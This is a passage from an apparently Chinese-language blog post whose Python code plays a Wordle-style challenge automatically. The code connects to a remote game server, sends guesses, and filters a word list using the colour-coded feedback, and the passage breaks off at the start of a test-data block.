class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">return</span> data_<span class="number">02</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">return</span> data_<span class="number">01</span></span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">3</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]</span></span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">02</span>) != <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">return</span> data_<span class="number">02</span></span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">return</span> data_<span class="number">01</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">return</span> data_<span class="number">02</span></span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">return</span> data_<span class="number">03</span></span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">4</span>:</span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each in data_<span class="number">01</span>:</span><br><span class="line">                <span class="attribute">if</span> each[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">01</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">03</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">02</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">03</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4), (&#x27;z4&#x27;, 5), (w4&quot;, 8)]</span></span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">01</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">03</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">        <span class="attribute">else</span>:  # data<span class="number">2</span> != <span class="number">0</span></span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">02</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">            <span class="attribute">else</span>:  # data<span class="number">3</span> != <span class="number">0</span></span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">03</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line">                <span class="attribute">else</span>:  # data<span class="number">4</span> != <span class="number">0</span></span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">HOST</span> = &#x27;<span class="number">47.106.102.129</span>&#x27;</span><br><span class="line"><span class="attribute">PORT</span> = <span class="number">49472</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="attribute">s</span>.connect((HOST, PORT))</span><br><span class="line"><span class="attribute">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择模式</span></span><br><span class="line"><span class="attribute">s</span>.send(&#x27;<span class="number">1</span>\n&#x27;.encode())</span><br><span class="line"><span class="attribute">s_</span> = str(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="attribute">print</span>(s_)</span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> each in range(<span class="number">515</span>):</span><br><span class="line">    <span class="attribute">state</span> = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 初始化数据</span></span><br><span class="line">    <span class="attribute">data</span> = open(&#x27;/Users/wenhui/Downloads/daf<span class="number">733</span>a<span class="number">35279428</span>eac<span class="number">1</span>b<span class="number">7</span>fcc<span class="number">43328</span>fe<span class="number">8</span>/valid_words.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">    <span class="attribute">data</span> = data.read().split(&#x27;\n&#x27;)</span><br><span class="line">    <span class="attribute">while</span> state == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 获取推荐并发送</span></span><br><span class="line">        <span class="attribute">GET</span> = get()</span><br><span class="line">        <span class="attribute">if</span> GET:</span><br><span class="line">            <span class="comment"># GET is a list of words</span></span><br><span class="line">            <span class="comment"># 进行元音字母筛选</span></span><br><span class="line">            <span class="attribute">YuanYin</span> = <span class="string">&quot;aeiou&quot;</span>  # 定义元音字母</span><br><span class="line">            <span class="attribute">dict_data</span> = &#123;&#125;  # 记录元音权重</span><br><span class="line">            <span class="attribute">if</span> len(GET) == <span class="number">1</span>:</span><br><span class="line">                <span class="attribute">tmp</span> = GET[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">for</span> word in GET:</span><br><span class="line">                    <span class="attribute">for</span> letter in word:</span><br><span class="line">                        <span class="attribute">if</span> letter in YuanYin:</span><br><span class="line">                            <span class="attribute">if</span> word in dict_data:</span><br><span class="line">                                <span class="attribute">dict_data</span>[word] += <span class="number">1</span></span><br><span class="line">                            <span class="attribute">else</span>:</span><br><span class="line">                                <span class="attribute">dict_data</span>[word] = <span class="number">1</span></span><br><span class="line">                <span class="attribute">Y</span> = list(dict_data.items())</span><br><span class="line">                <span class="attribute">Y</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">                <span class="comment"># [(&#x27;axxxx&#x27;, 1), (&#x27;bxxxx&#x27;, 2), (&#x27;cxxxx&#x27;, 3)]</span></span><br><span class="line">                <span class="attribute">tmp</span> = Y[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="attribute">print</span>(tmp)</span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">tmp</span> = data[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">print</span>(<span class="string">&quot;get居然失效了！&quot;</span>)</span><br><span class="line">            <span class="attribute">print</span>(data)</span><br><span class="line">        <span class="attribute">s</span>.send(&#x27;&#123;<span class="number">0</span>&#125;\n&#x27;.format(tmp).encode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接受反馈</span></span><br><span class="line">        <span class="attribute">s_</span> = str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="attribute">print</span>(s_)</span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> &#x27;Correct!&#x27; in s_:</span><br><span class="line">            <span class="attribute">state</span> = <span class="number">1</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 针对错误过程</span></span><br><span class="line">        <span class="attribute">s_</span> = &#x27;&#x27;.join(s_.split(<span class="string">&quot;b&#x27;Wrong!   &quot;</span>))</span><br><span class="line">        <span class="attribute">s_</span> = s_.split(r&#x27;  \x<span class="number">1</span>b[<span class="number">0</span>m&#x27;)</span><br><span class="line">        <span class="attribute">s_</span>.pop()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 人类的一小步</span></span><br><span class="line">        <span class="attribute">site</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">for</span> color in s_:</span><br><span class="line">            <span class="attribute">if</span> &#x27;<span class="number">47</span>m&#x27; in color:  # 白色 : 在这个位置, 这个字母不存在！</span><br><span class="line">                <span class="comment"># tmp = saves</span></span><br><span class="line">                <span class="comment"># 不在这个位置</span></span><br><span class="line">                <span class="attribute">del_word</span> = tmp[site - <span class="number">1</span>]  # <span class="string">&quot;s&quot;</span></span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word in data:</span><br><span class="line">                    <span class="attribute">if</span> word[site - <span class="number">1</span>] != del_word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;白色&quot;</span>, len(data))</span><br><span class="line"></span><br><span class="line">            <span class="attribute">elif</span> &#x27;<span class="number">43</span>m&#x27; in color:  # 黄色 : 字母存在，但不是这个位置</span><br><span class="line">                <span class="comment"># 存在</span></span><br><span class="line">                <span class="attribute">data1</span> = data</span><br><span class="line">                <span class="attribute">data</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> i in data<span class="number">1</span>:</span><br><span class="line">                    <span class="attribute">if</span> tmp[site - <span class="number">1</span>] in i:</span><br><span class="line">                        <span class="attribute">data</span>.append(i)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 不在这个位置</span></span><br><span class="line">                <span class="attribute">del_word</span> = tmp[site - <span class="number">1</span>]  # <span class="string">&quot;s&quot;</span></span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word in data:</span><br><span class="line">                    <span class="attribute">if</span> word[site - <span class="number">1</span>] != del_word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(word)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;黄色&quot;</span>, len(data))</span><br><span class="line"></span><br><span class="line">            <span class="attribute">elif</span> &#x27;<span class="number">42</span>m&#x27; in color:  # 绿色 : 字母存在 且 是在这个位置</span><br><span class="line">                <span class="comment"># 存在且位置正确</span></span><br><span class="line">                <span class="attribute">word</span> = tmp[site - <span class="number">1</span>]  # d</span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> i in data:</span><br><span class="line">                    <span class="attribute">if</span> i[int(site) - <span class="number">1</span>] == word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(i)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;绿色&quot;</span>, len(data))</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">print</span>(&#x27;啥也不是&#x27;, color)</span><br><span class="line">            <span class="attribute">site</span> += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 